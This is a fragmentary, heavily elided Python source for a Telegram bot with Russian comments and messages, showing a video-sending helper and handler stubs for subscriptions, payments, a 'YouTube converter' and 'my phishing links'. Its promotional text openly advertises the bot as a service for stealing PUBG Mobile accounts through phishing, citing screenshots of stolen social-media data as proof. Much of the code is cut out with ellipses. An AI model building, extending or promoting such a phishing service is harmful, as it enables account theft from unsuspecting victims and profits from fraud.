...
# ============================================
# ФУНКЦИИ ОТПРАВКИ КАРТИНОК ИЗ ВАШЕГО ВТОРОГО КОДА
# ============================================
...
async def send_video_or_text(chat_id, video_filename, caption, reply_markup=None):
    """
    Универсальная функция отправки видео или текста
    Если видео не найдено, отправляет текстовое сообщение
    """
    try:
        # Проверяем полный путь к файлу
        ...
        if os.path.exists(full_path):
            with open(full_path, 'rb') as video:
                return await bot.send_video(chat_id, video, caption=caption,
                                          reply_markup=reply_markup, parse_mode='HTML')
        else:
            # Проверяем другие форматы видео
            video_formats = ['video.MP4', 'video.mp4', 'video.mov', 'video.avi', 'video.mkv']
            for video_format in video_formats:
                full_path = os.path.join(BASE_DIR, video_format)
                if os.path.exists(full_path):
                    with open(full_path, 'rb') as video:
                        return await bot.send_video(chat_id, video, caption=caption,
                                                  reply_markup=reply_markup, parse_mode='HTML')
            
            logging.error(f"Видеофайл не найден: {video_filename}")
    except Exception as e:
        logging.error(f"Ошибка при отправке видео {video_filename}: {e}")
    
    # Если видео не найдено или ошибка, отправляем текстовое сообщение
    return await bot.send_message(chat_id, caption, 
                                reply_markup=reply_markup, parse_mode='HTML')
...
# ============================================
# КОНЕЦ ФУНКЦИЙ ОТПРАВКИ КАРТИНОК
# ============================================
...
📱 РЕАЛЬНЫЙ СКРИНШОТ РАБОТЫ БОТА - ДОКАЗАТЕЛЬСТВО

🚨 ВНИМАНИЕ: Этот бот специализируется на хищении аккаунтов PUBG Mobile через фишинг!
скриншот ниже является реальным доказательствами работы системы.
...
👇 Здесь показан реальный скриншот кражи данных из разных социальных сетей — посмотрите, как это работает.
""")
...
@dp.message_handler(lambda m: m.text == "💎 Подписки")
...
@dp.message_handler(lambda m: m.text == "🎬 YouTube Конвертер")
...
@dp.message_handler(lambda m: m.text == "🛡️ Безопасность")
...
@dp.callback_query_handler(lambda c: c.data == 'show_screenshots')
...
@dp.callback_query_handler(lambda c: c.data == 'show_subscriptions')
...
@dp.callback_query_handler(lambda c: c.data.startswith('buy_card_'))
...
@dp.callback_query_handler(lambda c: c.data == 'quick_generate')
...
""")
    ...
    await UserStates.waiting_for_youtube_url.set()
...
@dp.message_handler(state=UserStates.waiting_for_youtube_url)
...
@dp.callback_query_handler(lambda c: c.data == 'my_phishing_links')
...
async def top_up_balance(callback_query: types.CallbackQuery):
    await UserStates.waiting_for_amount.set()
    text = format_bold_text("""
💳 ПОПОЛНЕНИЕ БАЛАНСА
...
@dp.message_handler(state=UserStates.waiting_for_amount)
